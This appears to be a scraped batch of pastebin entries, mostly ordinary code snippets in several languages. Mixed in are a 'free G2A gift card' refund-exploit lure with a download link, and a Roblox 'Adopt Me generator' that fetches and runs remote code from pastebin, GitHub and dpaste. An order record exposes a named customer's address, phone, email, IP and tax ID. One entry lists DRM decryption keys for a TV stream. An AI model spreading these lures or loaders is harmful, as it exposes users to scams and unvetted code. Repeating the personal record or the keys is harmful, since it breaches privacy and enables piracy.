id,title,username,language,date,content
2WuddXpy,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Friday 24th of May 2024 12:02:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_657962.pdf

Working as of:
24 May 2024"
EnYDSrkp,MEItemComparer,AkaShiroKage,Lua,Friday 24th of May 2024 11:58:10 AM CDT,"local ME = peripheral.find(""meBridge"")
local deuterium = {
  name = ""gtceu:deuterium"",
  amount = 1
}

local function getFluid(fluid)
  local fluids = ME.listFluid()
  local serFluids = textutils.serialise(fluids)
  local start = string.find(serFluids, ""name = \"""" .. fluid)
  local sEnd = string.find(serFluids, ""}"", start)

  assert(start ~= nil)
  return string.sub(serFluids, start, sEnd)

end

local tritium = {
  name = ""gtceu:tritium"",
  amount = 1
}

local tritiumFromDeuteriumCraft = {
  name = ""gtceu:tritium"",
  count = 160
}

local function dump(o)
   if type(o) == 'table' then
      local s = '{ '
      for k,v in pairs(o) do
         if type(k) ~= 'number' then k = '""'..k..'""' end
         s = s .. '['..k..'] = ' .. dump(v) .. ','
      end
      return s .. '} '
   else
      return tostring(o)
   end
end

-- check for equal item stacks --
local function compareItems(itemA, itemB)

  return ME.getItem(itemA).name == ME.getItem(itemB).name
end

print(getFluid(deuterium.name))
--compareItems(deuterium, tritium)"
Q0PPvZdC,Adopt Me • Generator ^^2,Bacon_Script,Lua,Friday 24th of May 2024 11:52:18 AM CDT,"loadstring(game:HttpGet(""https://pastebin.com/raw/9pBsUXQ5""))()"
9pBsUXQ5,Adopt me • Generator,Bacon_Script,Lua,Friday 24th of May 2024 11:48:48 AM CDT,"local PabloLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/BatuKvi123/PabloLibV3/main/PabloLibV3""))()

local window = PabloLib:Create(
""ADOPT ME [AUTOFARM]"", -- Name here.
""Enabled"", -- If you want draggable set here to ""Enabled"" if you dont want set to ""Disabled"".
""p"" -- You can put any keybind here to open close.
)

local tab1 = window:CreateTab(""SCRIPT"")
tab1:CreateButton(""Generate Your Script"", function()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub""))()
loadstring(game:HttpGet(""https://dpaste.com/C69Y5S3X2.txt""))()
end)

tab1:CreateInfo(""Discord: https://discord.com/invite/3sW2kjHZTU"")
"
947cefFn,order_json,lgarcia_ebcomm,JSON,Friday 24th of May 2024 11:44:45 AM CDT,"{
    ""order"": {
        ""info"": {
            ""order_id"": 42,
            ""currency"": ""MXN"",
            ""currency_value"": ""1.0000"",
            ""payment_method"": ""Pago al Entregar"",
            ""payment_module_code"": ""cod"",
            ""shipping_method"": ""Env\u00edo Gratuito! (Env\u00edo Gratuito)"",
            ""shipping_module_code"": ""freeshipper"",
            ""coupon_code"": """",
            ""cc_type"": """",
            ""cc_owner"": """",
            ""cc_number"": """",
            ""cc_cvv"": null,
            ""cc_expires"": """",
            ""date_purchased"": ""2024-05-22 12:28:14"",
            ""orders_status"": ""1"",
            ""total"": ""9348.00"",
            ""tax"": ""0.00"",
            ""last_modified"": null,
            ""ip_address"": ""187.161.117.69 - 187.161.117.69"",
            ""language_code"": ""es"",
            ""order_weight"": ""0"",
            ""comments"": """",
            ""tax_groups"": {
                ""0.0000"": ""1""
            },
            ""status_history"": [
                {
                    ""orders_status_history_id"": ""71"",
                    ""orders_status_id"": ""1"",
                    ""date_added"": ""2024-05-22 12:28:14"",
                    ""customer_notified"": ""1"",
                    ""comments"": """",
                    ""updated_by"": """",
                    ""track_id"": """",
                    ""order_total"": null
                }
            ]
        },
        ""totals"": [
            {
                ""title"": ""Subtotal:"",
                ""text"": ""$9,348.00"",
                ""class"": ""ot_subtotal"",
                ""value"": ""9348.0000"",
                ""sort_order"": ""100""
            },
            {
                ""title"": ""Env\u00edo Gratuito! (Env\u00edo Gratuito):"",
                ""text"": ""$0.00"",
                ""class"": ""ot_shipping"",
                ""value"": ""0.0000"",
                ""sort_order"": ""200""
            },
            {
                ""title"": ""Impuesto de venta + IVA:"",
                ""text"": ""$0.00"",
                ""class"": ""ot_tax"",
                ""value"": ""0.0000"",
                ""sort_order"": ""300""
            },
            {
                ""title"": ""Total:"",
                ""text"": ""$9,348.00"",
                ""class"": ""ot_total"",
                ""value"": ""9348.0000"",
                ""sort_order"": ""999""
            }
        ],
        ""products"": [
            {
                ""qty"": 1,
                ""id"": ""53"",
                ""type"": ""1"",
                ""orders_products_id"": ""45"",
                ""name"": ""MOTOROLA G24\u00a08+256GB<p>(MOTOXT2425AZ)<\/p><br>(MOTOXT2425AZ)"",
                ""model"": ""MOTOXT2425"",
                ""tax"": ""0.0000"",
                ""price"": ""9348.0000"",
                ""final_price"": ""9348.0000"",
                ""onetime_charges"": ""0.0000"",
                ""products_priced_by_attribute"": ""0"",
                ""product_is_free"": ""0"",
                ""products_discount_type"": ""0"",
                ""products_discount_type_from"": ""0"",
                ""products_weight"": ""0"",
                ""products_virtual"": 0,
                ""product_is_always_free_shipping"": 1,
                ""products_quantity_order_min"": ""1"",
                ""products_quantity_order_units"": ""1"",
                ""products_quantity_order_max"": ""0"",
                ""products_quantity_mixed"": 1,
                ""products_mixed_discount_quantity"": 1,
                ""products_prid"": ""53:6e88e5c1b64d0828710309754f1625b1"",
                ""attributes"": [
                    {
                        ""option"": ""Periodo de plan"",
                        ""value"": ""12 Meses"",
                        ""option_id"": ""4"",
                        ""value_id"": ""12"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Color"",
                        ""value"": ""Azul"",
                        ""option_id"": ""1"",
                        ""value_id"": ""5"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Capacidad"",
                        ""value"": ""256 GB"",
                        ""option_id"": ""2"",
                        ""value_id"": ""18"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Plan"",
                        ""value"": ""PLAN MAX"",
                        ""option_id"": ""0"",
                        ""value_id"": ""0"",
                        ""prefix"": """",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    }
                ],
                ""subproduct"": {
                    ""product_model"": ""MOTOXT2425AZ""
                }
            }
        ],
        ""customer"": {
            ""id"": ""6"",
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1"",
            ""telephone"": ""8115616646"",
            ""fax"": ""8115616646"",
            ""email_address"": ""lgarcia@ebcomm.mx""
        },
        ""delivery"": {
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1""
        },
        ""billing"": {
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""rfc"": ""GAOL851101QN9"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1"",
            ""invoice_request"": {
                ""cfdi_code"": ""D01"",
                ""fiscal_regime_code"": ""605"",
                ""sat_cfdi_usage_description"": ""Honorarios m\u00e9dicos, dentales y gastos hospitalarios"",
                ""sat_fiscal_regime_description"": ""Sueldos y Salarios e Ingresos Asimilados a Salarios""
            }
        },
        ""content_type"": null,
        ""email_low_stock"": null,
        ""products_ordered_attributes"": null,
        ""products_ordered"": null,
        ""products_ordered_email"": null,
        ""products_ordered_html"": null,
        ""attachArray"": null,
        ""email_order_message"": null,
        ""extra_header_text"": null,
        ""doStockDecrement"": null,
        ""send_low_stock_emails"": null,
        ""queryReturnFlag"": null,
        ""bestSellersUpdate"": null,
        ""use_external_tax_handler_only"": null,
        ""subtotal"": null,
        ""total_tax"": null,
        ""total_weight"": null,
        ""total_cost"": null,
        ""products_ordered_attributes_html"": [],
        ""delivery_boxes"": null,
        ""email_template"": ""checkout"",
        ""hide_delivery_info"": false
    }
}"
e89U9rW5,javascript classes,runnig,JavaScript,Friday 24th of May 2024 11:06:46 AM CDT,"// @ts-check

class Title {
  #title;

  /**
   * @param {string} title 
   */
  constructor(title) {
    if (typeof title != 'string') {
      throw new Error('input argument must be a string');
    }
    if (title.length > 80) {
      throw new Error('Title is too long');
    }
    this.#title = title;
  }

  get title() {
    return this.#title;
  }
}

class Content {
  #content;
  /** @param {string} content */
  constructor(content) {
    if (typeof content != 'string') {
      throw new Error('input argument must be a string');
    }
    this.#content = content;
  }

  get content() {
    return this.#content;
  }
}

class Url {
  #url;
  /** @param {string} url */
  constructor(url) {
    if (typeof url != 'string') {
      throw new Error('input argument must be a string');
    }
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      throw new Error('Invalid URL');
    }
    this.#url = url;
  }

  get url() {
    return this.#url;
  }
}


class Post {
  /**
   * @param {Title} title 
   * @param {Content} content 
   * @param {Url} imageUrl 
   */
  constructor(title, content, imageUrl) {
    if (!(title instanceof Title)) {
      throw new Error('title must be an instance of Title');
    }
    if (!(content instanceof Content)) {
      throw new Error('content must be an instance of Content');
    }
    if (!(imageUrl instanceof Url)) {
      throw new Error('imageUrl must be an instance of Url');
    }
    this._title = title;
    this._content = content;
    this._imageUrl = imageUrl;
  }

  /** @returns {string} */
  get title() {
    return this._title.title;
  }

  /** @returns {string} */
  get content() {
    return this._content.content;
  }

  /** @returns {string} */
  get imageUrl() {
    return this._imageUrl.url;
  }

  toString() {
    return `${this.title}\n${this.content}\n${this.imageUrl}`;
  }
}

const post = new Post(
  new Title('This is a title.'),
  new Content('This is a post.'),
  new Url('http://example.com'));

console.log(post.toString());
"
0YDwsnkL,love4k.json,Saleng,JSON,Friday 24th of May 2024 11:05:02 AM CDT,"{""mid"":""501"",""title"":""love4k"",""seo"":""love4k"",""alt_lang1"":""love4k"",""poster"":""https://upload.wikimedia.org/wikipedia/en/1/1d/Love_Nature_TV.png"",""views"":10829043,""clearKeys"":""7d0b58f6ba324ad5bf123a8098e3ad2f:45906f0ddd1e4c28ba9e9dc138d75da8"",""linkvideo"":""https://ubn-streamer1.cdn.3bbtv.com:8443/3bb/live/501/501.mpd"",""link"":null}"
MKGFktfu,ARM_RAMB_4kx32,madegoff,VHDL,Friday 24th of May 2024 11:02:05 AM CDT,"--------------------------------------------------------------------------------
--	Wrapper um Basys3-Blockram fuer den RAM des HWPR-Prozessors.
--------------------------------------------------------------------------------
--	Datum:		23.05.2022
--	Version:	1.1
--------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

entity ArmRAMB_4kx32 is
	generic(
--------------------------------------------------------------------------------
--	SELECT_LINES ist fuer das HWPR irrelevant, wird aber in einer
--	komplexeren Variante dieses Speichers zur Groessenauswahl
--	benoetigt. Im Hardwarepraktikum bitte ignorieren und nicht aendern.
--------------------------------------------------------------------------------
		SELECT_LINES : natural range 0 to 2 := 1);
    port(
		RAM_CLK	: in  std_logic;
        ENA		: in  std_logic;
		ADDRA	: in  std_logic_vector(11 downto 0);
        WEB		: in  std_logic_vector(3 downto 0);
        ENB		: in  std_logic;
		ADDRB	: in  std_logic_vector(11 downto 0);
        DIB		: in  std_logic_vector(31 downto 0);
        DOA		: out  std_logic_vector(31 downto 0);
        DOB		: out  std_logic_vector(31 downto 0));
end entity ArmRAMB_4kx32;


architecture behavioral of ArmRAMB_4kx32 is
    
    type ram_type is array (4095 downto 0) of std_logic_vector(31 downto 0);
    signal RAM : ram_type;
    begin
    WRITE_AND_READ: process(RAM_CLK)
    begin
        if(rising_edge(RAM_CLK)) then
            if (ENA = '1') then --wenn enable A, lesen aus dem RAM anstelle (int) der entsprechenden Register Adresse
                DOA <= RAM(to_integer(unsigned(ADDRA))); 
            end if;
        
            -- DIB hat die Form: |++++|++++|++++|++++| besteht aus 32 Bit - 4 Bloecken
        
            if (ENB = '1') then --wenn enable B, kann man aus B lesen oder auf B schreiben, je nach WEB
                if (WEB = ""0000"") then --lesezugriff auf port B
                    DOB <= RAM(to_integer(unsigned(ADDRB)));
                end if;
            
                if (WEB(0) = '1') then --erstes block (die letzten 8Bit) schreiben 
                    RAM(to_integer(unsigned(ADDRB)))(7 downto 0) <= DIB(7 downto 0);
                end if;
                if (WEB(1) = '1') then -- zweites block
                    RAM(to_integer(unsigned(ADDRB)))(15 downto 8) <= DIB(15 downto 8);
                end if;
                if (WEB(2) = '1') then --drittes block
                    RAM(to_integer(unsigned(ADDRB)))(23 downto 16) <= DIB(23 downto 16);
                end if;
                if (WEB(3) = '1') then --viertes block
                    RAM(to_integer(unsigned(ADDRB)))(31 downto 24) <= DIB(31 downto 24);
                end if;
            end if;
        end if;
                        
    end process;
end architecture behavioral;
"
1suDECV5,GTM Snippet - mozzshieldrepellent,prabapro,JavaScript,Friday 24th of May 2024 10:51:15 AM CDT,"<!-- 1. In the <head> tag -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://metrics.mozzshieldrepellent.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-W94L8P2K');</script>
<!-- End Google Tag Manager -->

<!-- 2. Immediately after the opening <body> tag -->
<noscript><iframe src=""https://metrics.mozzshieldrepellent.com/ns.html?id=GTM-W94L8P2K""
height=""0"" width=""0"" style=""display:none;visibility:hidden""></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->"
0bGHzfF9,Untitled,MeehoweCK,C++,Friday 24th of May 2024 10:25:55 AM CDT,"#include <iostream>
#include <ctime>

using namespace std;

const int ROZMIAR{ 6 };

bool czyJuzJest(int liczba, int tablica[], int n) {
	for (auto i{ 0 }; i < n; ++i) {
		if (tablica[i] == liczba) {
			return true;
		}
	}
	return false;
}

void wypelni(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		int losowa;
		do {
			losowa = rand() % 49 + 1;
		} while (czyJuzJest(losowa, tab, i));
		tab[i] = losowa;
	}
}

void wyswietl(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		cout << tab[i] << ' ';
	}
	cout << endl;
}

int main() {
	int tab[ROZMIAR];
	srand(time(nullptr));
	wypelni(tab);
	wyswietl(tab);
	return 0;
}"
zZADNDyf,Sirma Academy - Arrays - 13. Negative / Positive Numbers,AtanasStoyanov,JavaScript,Friday 24th of May 2024 10:24:01 AM CDT,"function prependNegatives(numbers) {
  const resultNumbers = [];

  numbers.forEach((currentNumber) => {
    if (currentNumber < 0) {
      resultNumbers.unshift(currentNumber);
    } else {
      resultNumbers.push(currentNumber);
    }
  });

  resultNumbers.forEach((number) => console.log(number));
}

prependNegatives([7, -2, 8, 9]);
prependNegatives([3, -2, 0, -1]);
"
fiaZaGBa,Sirma Academy - Arrays - 11. Rotate Array (recursion),AtanasStoyanov,JavaScript,Friday 24th of May 2024 10:23:15 AM CDT,"function rotate(arr) {
  const arrLength = arr.length;
  const lastElement = arr[arrLength - 1]; 
  for (let index = arrLength - 1; index > 0; index--) {
    arr[index] = arr[index - 1];
  }
  arr[0] = lastElement;
}

function rotateArray(arr, rotations) {
  for (let i = 0; i < rotations; i++) {
    rotate(arr);    
  }
  console.log(arr.join("" ""));
}

rotateArray(['1', '2', '3', '4'], 2);
rotateArray(['Banana', 'Orange', 'Coconut', 'Apple'], 15);
"
EHgiyKZT,Beta 1.7V1,Shiko5303,Lua,Friday 24th of May 2024 10:22:18 AM CDT,gg.sleep(10)
